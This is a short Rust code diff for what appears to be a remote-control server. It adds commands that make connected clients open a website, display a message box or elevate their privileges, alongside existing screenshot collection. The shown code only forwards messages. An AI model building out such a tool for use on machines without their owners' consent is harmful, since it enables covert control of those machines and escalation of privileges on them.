@@ -147,6 +147,27 @@ impl ServerWrapper {
                                         
                     self.emit_client_connected(&client_info, &addr).await;
                 }
+                VisitWebsite(addr, visit_data) => {
+                    if let Some(tx) = self.txs.get(&addr) {
+                        tx.send(ClientCommand::Write(ClientboundPacket::VisitWebsite(visit_data)))
+                            .await
+                            .unwrap_or_else(|e| println!("Failed to send visit website request: {}", e));
+                    }
+                }
+                ShowMessageBox(addr, message_box_data) => {
+                    if let Some(tx) = self.txs.get(&addr) {
+                        tx.send(ClientCommand::Write(ClientboundPacket::ShowMessageBox(message_box_data)))
+                            .await
+                            .unwrap_or_else(|e| println!("Failed to send show message box request: {}", e));
+                    }
+                }
+                ElevateClient(addr) => {
+                    if let Some(tx) = self.txs.get(&addr) {
+                        tx.send(ClientCommand::Write(ClientboundPacket::ElevateClient))
+                            .await
+                            .unwrap_or_else(|e| println!("Failed to send elevate client request: {}", e));
+                    }
+                }
                 ScreenshotData(_addr, screenshot_data) => {                    
                     let base64_img = general_purpose::STANDARD.encode(&screenshot_data);
                     
